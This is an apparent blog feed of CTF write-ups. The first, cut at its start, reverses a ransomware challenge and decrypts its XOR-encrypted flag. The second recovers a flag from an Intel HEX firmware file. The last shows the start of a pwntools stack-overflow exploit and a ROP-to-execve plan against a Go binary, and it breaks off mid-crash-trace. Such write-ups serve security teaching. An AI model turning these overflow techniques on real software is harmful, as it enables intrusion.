struct.pack (<span class="string">"16B"</span>, *[</span><br><span class="line"><span class="number">0xea</span>,<span class="number">0xe8</span>,<span class="number">0xe4</span>,<span class="number">0xe8</span>,<span class="number">0xef</span>,<span class="number">0xdb</span>,<span class="number">0xe1</span>,<span class="number">0xeb</span>,<span class="number">0xe6</span>,<span class="number">0xe0</span>,<span class="number">0xa9</span>,</span><br><span class="line"><span class="number">0xea</span>,<span class="number">0xe8</span>,<span class="number">0xe4</span>,<span class="number">0xe8</span>,<span class="number">0xef</span>])</span><br><span class="line"><span class="keyword">print</span> sub_4005D0(al=<span class="string">'\x87'</span>,ecx=<span class="number">0x11</span><span class="number">-1</span>, edx=first)</span><br></pre></td></tr></table></figure><p>By running the script we can see that the encrypted string was the name of the file we received from the challenge which was encrypted:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python writeup_mocoh.py </span><br><span class="line">mocoh\flag.moco</span><br></pre></td></tr></table></figure><p>One good thing to do while reversing is to rename the function and string names to a more readable names, so if they are reused we can immediately recognize them :<br><a data-fancybox="gallery" href="https://i.imgur.com/AAnYTBF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/AAnYTBF.png" alt=""><br></a></p><p>Now continuing analysing the contents of <code>sub_40023B</code> we have more strings to decrypt:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/qjZakVp.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/qjZakVp.png" alt=""><br></a></p><p>Updating this python script with this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_4005D0</span><span class="params">(al, ecx, edx)</span>:</span></span><br><span class="line">c = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</span><br><span class="line">c += chr(ord(edx[i]) ^ ord(al))</span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">first = struct.pack (<span class="string">"16B"</span>, *[</span><br><span class="line"><span class="number">0xea</span>,<span class="number">0xe8</span>,<span class="number">0xe4</span>,<span class="number">0xe8</span>,<span class="number">0xef</span>,<span class="number">0xdb</span>,<span class="number">0xe1</span>,<span class="number">0xeb</span>,<span class="number">0xe6</span>,<span class="number">0xe0</span>,<span class="number">0xa9</span>,</span><br><span class="line"><span class="number">0xea</span>,<span class="number">0xe8</span>,<span class="number">0xe4</span>,<span class="number">0xe8</span>,<span class="number">0xef</span>])</span><br><span class="line"><span class="keyword">print</span> sub_4005D0(al=<span class="string">'\x87'</span>,ecx=<span class="number">0x11</span><span class="number">-1</span>, edx=first)</span><br><span class="line">a = sub_4005D0(al=<span class="string">'\x54'</span>,ecx=<span class="number">9</span><span class="number">-1</span>, edx=struct.pack (<span class="string">"8B"</span>, *[</span><br><span class="line"><span class="number">0x27</span>,<span class="number">0x31</span>,<span class="number">0x21</span>,<span class="number">0x26</span>,<span class="number">0x21</span>,<span class="number">0x36</span>,<span class="number">0x21</span>,<span class="number">0x37</span>]))</span><br><span class="line">b = sub_4005D0(al=<span class="string">'\x80'</span>,ecx=<span class="number">9</span><span class="number">-1</span>, edx=struct.pack (<span class="string">"8B"</span>, *[</span><br><span class="line"><span class="number">0xe1</span>,<span class="number">0xee</span>,<span class="number">0xf4</span>,<span class="number">0xe1</span>,<span class="number">0xf3</span>,<span class="number">0xf3</span>,<span class="number">0xe5</span>,<span class="number">0xe5</span>]))</span><br><span class="line">c = sub_4005D0(al=<span class="string">'\x14'</span>,ecx=<span class="number">9</span><span class="number">-1</span>, edx=struct.pack (<span class="string">"8B"</span>, *[</span><br><span class="line"><span class="number">0x61</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0x78</span>,<span class="number">0x7b</span>,<span class="number">0x77</span>,<span class="number">0x75</span>,<span class="number">0x62</span>]))</span><br><span class="line">d = sub_4005D0(al=<span class="string">'\x32'</span>,ecx=<span class="number">0xa</span><span class="number">-1</span>, edx=struct.pack (<span class="string">"9B"</span>, *[</span><br><span class="line"><span class="number">0x53</span>,<span class="number">0x5c</span>,<span class="number">0x53</span>,<span class="number">0x55</span>,<span class="number">0x53</span>,<span class="number">0x5b</span>,<span class="number">0x5d</span>,<span class="number">0x5e</span>,<span class="number">0x53</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line"><span class="keyword">print</span> b</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"><span class="keyword">print</span> d</span><br></pre></td></tr></table></figure><p>By running we can see it’s some words in Portuguese and they don’t look really useful at all:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python mocoh.py</span><br><span class="line">mocoh\flag.mocoh</span><br><span class="line">mocoh\flag.mocoh</span><br><span class="line">seurubuc</span><br><span class="line">antassee</span><br><span class="line">ucolocav</span><br><span class="line">anagaiola</span><br></pre></td></tr></table></figure><p>After renaming the variable names in IDA ended up in this final part of the program:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/LdcEHnx.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/LdcEHnx.png" alt=""><br></a></p><p>As you can see above every string we decrypted is being concatenated into a place in memory at <strong>dword_4012c0</strong>, and at the end in <strong>sub_4005DA</strong> the flag file name is being pushed in to the stack since this will be a argument to that function so this may be the one that was used to encrypted the <em>flag.mocoh</em> file!</p><p><a data-fancybox="gallery" href="https://i.imgur.com/TCnKYK2.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/TCnKYK2.png" alt=""><br></a></p><p>Now by checking this function I found it too hard to reverse <strong>sub_400684</strong>, without running the malware itself (Couldn’t do it since it executable wasn’t compatible with my Windows 10 VM), so after failing to infect myself and debugging it with IDA, I checked that <strong>sub_4006D8</strong> of them was using xor again to encrypt that file:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/DZrDX8X.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/DZrDX8X.png" alt=""><br></a></p><p>Now you may be asking if I didn’t reverse <strong>sub_400684</strong> how the hell I did get the keys to decrypt the flag file? well I wasn’t really expecting this to happen but at some point I knew I could know the first 4 bytes of the key because we know the first 4 bytes of the plaintext which is part of the flag format <strong>3DS{</strong>, I wanted to check before reversing the rest, the first 4 bytes of the key, I did this by brute-forcing byte by byte:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag_cipher = open(<span class="string">'flag.mocoh'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">plain = <span class="string">'3DS&#123;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x4</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line">        <span class="keyword">if</span> ord(plain[i]) == ord(flag_cipher[i]) ^ x:</span><br><span class="line">            <span class="keyword">print</span> x</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>And surprisingly to me the first 4 bytes of the keys was always <strong>175</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py </span><br><span class="line">175</span><br><span class="line">175</span><br><span class="line">175</span><br><span class="line">175</span><br></pre></td></tr></table></figure><p>And then I asked myself what if the key is always the same? this couldn’t be a coincidence:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag_cipher = open(<span class="string">'flag.mocoh'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i,c <span class="keyword">in</span> enumerate(flag_cipher):</span><br><span class="line">    flag += chr(ord(c) ^ <span class="number">175</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>Running it we could see that this was the case…<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py </span><br><span class="line">3DS&#123;4sS3mbly_r0cks!!&#125;</span><br></pre></td></tr></table></figure></p><p>And in the end I realized that I lost a lot of time reversing the binary, we didn’t even needed to reverse anything, if we made a guess that it was xor we could just tried and check that it was using always the same 1 byte key to encrypt…</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;Ransomware - 464 Points&lt;br&gt;WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!&lt;br&gt;&lt;/blockquote&gt;

&lt;p&gt;We have a
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
      <category term="malware" scheme="https://teamrocketist.github.io/tags/malware/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="3DS2017" scheme="https://teamrocketist.github.io/tags/3DS2017/"/>
    
      <category term="ida" scheme="https://teamrocketist.github.io/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 3DS - Scared Flag</title>
    <link href="https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Scared-Flag/"/>
    <id>https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Scared-Flag/</id>
    <published>2017-12-18T03:58:03.000Z</published>
    <updated>2018-10-24T23:21:04.862Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Scared Flag - 479 Points<br><br>ヽ(ﾟДﾟ)ﾉ<br></blockquote><p>After unzipping the file we can see that we have a <strong>.hex</strong> which according to <a href="https://en.wikipedia.org/wiki/Intel_HEX" target="_blank" rel="noopener">Wikipedia</a>:</p><blockquote><p>Intel HEX is a file format that conveys binary information in ASCII text form. It is commonly used for programming microcontrollers, EPROMs, and other types of programmable logic devices. In a typical application, a compiler or assembler converts a program’s source code (such as in C or assembly language) to machine code and outputs it into a HEX file.</p></blockquote><p>So after finding out what the hell was this I searched in the web a way to convert this into a binary format or assembly, and I found a post in stack overflow recommending to use <a href="http://www.keil.com/download/docs/7.asp" target="_blank" rel="noopener">this</a>…</p><p>After downloading, I made the conversion:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2bin -b ../ea137e7356e566945e51bbece00a22ad.hex </span><br><span class="line">hex2bin v2.5, Copyright (C) 2017 Jacques Pelletier &amp; contributors</span><br><span class="line"></span><br><span class="line">Allocate_Memory_and_Rewind:</span><br><span class="line">Lowest address:   00000000</span><br><span class="line">Highest address:  00000BC5</span><br><span class="line">Starting address: 00000000</span><br><span class="line">Max Length:       3014</span><br><span class="line"></span><br><span class="line">Binary file start = 00000000</span><br><span class="line">Records start     = 00000000</span><br><span class="line">Highest address   = 00000BC5</span><br><span class="line">Pad Byte          = FF</span><br></pre></td></tr></table></figure><p>The program outputs a <strong>ea137e7356e566945e51bbece00a22ad.bin</strong>, I used radare2 to reverse it, after checking the code I saw the <strong>initials of the flag</strong> in this routine at <strong>fcn.000005de</strong> (You need to scroll down a little in radare2 the function is quite big).<br><a data-fancybox="gallery" href="https://i.imgur.com/W7YSGzM.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/W7YSGzM.png" alt=""><br></a><br>The flag was 3DS{youareabully}</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;Scared Flag - 479 Points&lt;br&gt;&lt;br&gt;ヽ(ﾟДﾟ)ﾉ&lt;br&gt;&lt;/blockquote&gt;

&lt;p&gt;After unzipping the file we can see that we have a &lt;strong&gt;.hex
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="3DS2017" scheme="https://teamrocketist.github.io/tags/3DS2017/"/>
    
      <category term="intel_hex" scheme="https://teamrocketist.github.io/tags/intel-hex/"/>
    
      <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
    
      <category term="hex2bin" scheme="https://teamrocketist.github.io/tags/hex2bin/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] SECCON - Baby Stack</title>
    <link href="https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/"/>
    <id>https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/</id>
    <published>2017-12-13T04:05:45.000Z</published>
    <updated>2018-11-06T04:27:48.966Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Baby Stack<br><br>Can you do a traditional stack attack?<br><br>Host : baby_stack.pwn.seccon.jp<br>Port : 15285<br>baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8<br></blockquote><h3 id="Overflow-the-Buffer"><a href="#Overflow-the-Buffer" class="headerlink" title="Overflow the Buffer"></a>Overflow the Buffer</h3><p>We have a <strong>go executable</strong> which is <strong>harder</strong> to reverse than c, by reading the challenge title we can see that this challenge is probably about a <strong>buffer overflow in the stack</strong>, another thing we also notice that the binary is <strong>statically linked</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 </span><br><span class="line">baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped</span><br></pre></td></tr></table></figure><p>Since is statically linked we know that this binary <strong>isn’t</strong> going to use the <strong>libc file in our system</strong>, every libc function used is <strong>embedded</strong> in the binary itself, this a problem we can’t just jump into libc because some useful functions like <strong>system</strong> aren’t present, but we can still build a ROP chain that does a system call to execve, this is very similar to writting shellcode but instead of writting a script we are going to use gadgets to build it.</p><p>By checking the security of the binary we can see the only protection enabled is <strong>NX (Non-Executable Stack)</strong>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br></pre></td></tr></table></figure><p>We don’t have a stack canary to stop us so the first thing to do is to run the binary:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 </span><br><span class="line">Please tell me your name &gt;&gt; A</span><br><span class="line">Give me your message &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa</span><br><span class="line">unexpected fault address 0x0</span><br><span class="line">fatal error: fault</span><br><span class="line">[signal 0xb code=0x80 addr=0x0 pc=0x456551]</span><br><span class="line"></span><br><span class="line">goroutine 1 [running]:</span><br><span class="line">runtime.throw(0x507550, 0x5)</span><br><span class="line">/usr/lib/go-1.6/src/runtime/panic.go:547 +0x90 fp=0xc82003f5b8 sp=0xc82003f5a0</span><br><span class="line">runtime.sigpanic()</span><br><span class="line">/usr/lib/go-1.6/src/runtime/sigpanic_unix.go:27 +0x2ab fp=0xc82003f608 sp=0xc82003f5b8</span><br><span class="line">runtime.memmove(0xc82008a00b, 0x4141414141414141, 0x61414141)</span><br><span class="line">/usr/lib/go-1.6/src/runtime/memmove_amd64.s:83 +0x91 fp=0xc82003f610 sp=0xc82003f608</span><br><span class="line">fmt.(*fmt).padString(0xc82006ebb8, 0x4141414141414141, 0x61414141)</span><br><span class="line">/usr/lib/go-1.6/src/fmt/format.go:130 +0x456 fp=0xc82003f730 sp=0xc82003f610</span><br><span class="line">fmt.(*fmt).fmt_s(0xc82006ebb8, 0x4141414141414141, 0x61414141)</span><br><span class="line">/usr/lib/go-1.6/src/fmt/format.go:322 +0x61 fp=0xc82003f760 sp=0xc82003f730</span><br><span class="line">fmt.(*pp).fmtString(0xc82006eb60, 0x4141414141414141, 0x61414141, 0xc800000073)</span><br><span class="line">/usr/lib/go-1.6/src/fmt/print.go:521 +0xdc fp=0xc82003f790 sp=0xc82003f760</span><br><span class="line">fmt.(*pp).printArg(0xc82006eb60, 0x4c1c00, 0xc82000a380, 0x73, 0x0, 0x0)</span><br><span class="line">/usr/lib/go-1.6/src/fmt/print.go:797 +0xd95 fp=0xc82003f918 sp=0xc82003f790</span><br><span class="line">fmt.(*pp).doPrintf(0xc82006eb60, 0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2)</span><br><span class="line">/usr/lib/go-1.6/src/fmt/print.go:1238 +0x1dcd fp=0xc82003fca0 sp=0xc82003f918</span><br><span class="line">fmt.Fprintf(0x7fcd857d21e8, 0xc82002c010, 0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2, 0x40beee, 0x0, 0x0)</span><br><span class="line">/usr/lib/go-1.6/src/fmt/print.go:188 +0x74 fp=0xc82003fce8 sp=0xc82003fca0</span><br><span class="line">fmt.Printf(0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2, 0x20, 0x0, 0x0)</span><br><span class="line">/usr/lib/go-1.6/src/fmt/print.go:197 +0x94 fp=0xc82003fd50 sp=0xc82003fce8</span><br><span class="line">main.main()</span><br><span class="line">/home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x45e fp=0xc82003ff50 sp=0xc82003fd50</span><br><span class="line">runtime.main()</span><br><span class="line">/usr/lib/go-1.6/src/runtime/proc.go:188 +0x2b0 fp=0xc82003ffa0 sp=0xc82003ff50</span><br><span class="line">runtime.goexit()</span><br><span class="line">/usr/lib/go-1.6/src/runtime/asm_amd64.s:1998 +0x1 fp=0xc82003ffa8 sp=0xc82003ffa0</span><br></pre></td></tr></table></figure><p>We did overflow the buffer but what really happened here? If you look at the stack traces we <strong>aren’t</strong> really getting a <strong>segmentation fault</strong> because we are replacing the ret address, the exception is occurring because we are changing the parameters of <strong><code>fmt.Printf</code></strong>, the binary isn’t reaching the <strong><code>ret</code></strong> instruction because of this, we need to set some <strong>break points</strong> before this prints to put the correct addresses on them, something that doesn’t crash the program.</p><p>To check good breakpoint addresses I used IDA, radare2 was way too slow and didn’t gave me nice results on it, after opening it in IDA I searched for a function named <strong><code>main_main</code></strong> and tryed to find a function <strong><code>bufio___Scanner__Scan</code></strong> which in go is a function that reads inputs from the <strong><code>STDIN</code></strong>.<br><a data-fancybox="gallery" href="https://i.imgur.com/0kyUAPc.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/0kyUAPc.png" alt=""><br></a><br>Checking it on another view to check its addresses:<br><a data-fancybox="gallery" href="https://i.imgur.com/HEuxv0i.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/HEuxv0i.png" alt=""><br></a></p><p>After setting some breakpoints in the <strong>printf’s</strong> after those 2 scans, I realised that the padding needed to reach the 1st parameter was <strong>104</strong> so we can start testing it in the binary:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'A'*104 + 'BBBBBBBB'"</span></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB</span><br><span class="line">$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 </span><br><span class="line">Please tell me your name &gt;&gt; A</span><br><span class="line">Give me your message &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB</span><br><span class="line">...</span><br><span class="line">runtime.memmove(0xc82000e30b, 0x4242424242424242, 0x1)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>There it is, we are replacing the address of the string that <strong><code>printf</code></strong> wants to print, we can’t continue overflowing the rest to reach the <strong><code>ret</code></strong> instruction, to get this valid address I just picked a value that I got from gdb from the stack:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b *0x4011D2</span><br><span class="line">Note: breakpoint 1 also set at pc 0x4011d2.</span><br><span class="line">Breakpoint 2 at 0x4011d2: file /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go, line 18.</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 </span><br><span class="line">[New LWP 8293]</span><br><span class="line">[New LWP 8294]</span><br><span class="line">[New LWP 8295]</span><br><span class="line">Please tell me your name &gt;&gt; A</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x1 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0xc82000a2c1 --&gt; 0x41 (&apos;A&apos;)</span><br><span class="line">RDX: 0xc820074000 --&gt; 0xa41 (&apos;A\n&apos;)</span><br><span class="line">RSI: 0xc820074000 --&gt; 0xa41 (&apos;A\n&apos;)</span><br><span class="line">RDI: 0xc82000a2c1 --&gt; 0x41 (&apos;A&apos;)</span><br><span class="line">RBP: 0x0 </span><br><span class="line">RSP: 0xc82003fd50 --&gt; 0x521e40 (&quot;Give me your message &gt;&gt; &quot;)</span><br><span class="line">RIP: 0x4011d2 (&lt;main.main+466&gt;:call   0x45ac40 &lt;fmt.Printf&gt;)</span><br><span class="line">R8 : 0x1 </span><br><span class="line">R9 : 0x1000 </span><br><span class="line">R10: 0xc820074000 --&gt; 0xa41 (&apos;A\n&apos;)</span><br><span class="line">R11: 0x202 </span><br><span class="line">R12: 0x15 </span><br><span class="line">R13: 0x536a54 --&gt; 0x201fe001001e4 </span><br><span class="line">R14: 0x1 </span><br><span class="line">R15: 0x8</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x4011c3 &lt;main.main+451&gt;:mov    QWORD PTR [rsp+0x10],rbx</span><br><span class="line">   0x4011c8 &lt;main.main+456&gt;:mov    QWORD PTR [rsp+0x18],rbx</span><br><span class="line">   0x4011cd &lt;main.main+461&gt;:mov    QWORD PTR [rsp+0x20],rbx</span><br><span class="line">=&gt; 0x4011d2 &lt;main.main+466&gt;:call   0x45ac40 &lt;fmt.Printf&gt;</span><br><span class="line">   0x4011d7 &lt;main.main+471&gt;:mov    rbx,QWORD PTR [rsp+0x80]</span><br><span class="line">   0x4011df &lt;main.main+479&gt;:mov    QWORD PTR [rsp],rbx</span><br><span class="line">   0x4011e3 &lt;main.main+483&gt;:call   0x46cbc0 &lt;bufio.(*Scanner).Scan&gt;</span><br><span class="line">   0x4011e8 &lt;main.main+488&gt;:mov    rax,QWORD PTR [rsp+0x80]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xc82003fd50 --&gt; 0x521e40 (&quot;Give me your message &gt;&gt; &quot;)</span><br><span class="line">0008| 0xc82003fd58 --&gt; 0x18 </span><br><span class="line">0016| 0xc82003fd60 --&gt; 0x0 </span><br><span class="line">0024| 0xc82003fd68 --&gt; 0x0 </span><br><span class="line">0032| 0xc82003fd70 --&gt; 0x0 </span><br><span class="line">0040| 0xc82003fd78 --&gt; 0x1 </span><br><span class="line">0048| 0xc82003fd80 --&gt; 0x0 </span><br><span class="line">0056| 0xc82003fd88 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br></pre></td></tr></table></figure><p>For example an address from the stack can be something like <strong><code>0xc82003fd58</code></strong> with this we can start writing the exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">padding = <span class="string">'A'</span> * <span class="number">104</span> + p64(<span class="number">0xc82003fd58</span>) + <span class="string">'AAAAAAAA'</span></span><br><span class="line">process(<span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Please tell me your name &gt;&gt; '</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Give me your message &gt;&gt; '</span>)</span><br><span class="line">r.sendline(padding)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>By running it we can see we are still replacing another parameter from <strong><code>printf</code></strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python writeup.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>: pid 8433</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">panic: runtime error: growslice: <span class="built_in">cap</span> out of range</span><br><span class="line"></span><br><span class="line">goroutine 1 [running]:</span><br><span class="line">panic(0x4e4800, 0xc820070280)</span><br><span class="line">    /usr/lib/go-1.6/src/runtime/panic.go:481 +0x3e6</span><br><span class="line">fmt.(*fmt).padString(0xc820076ef8, 0xc82003fd58, 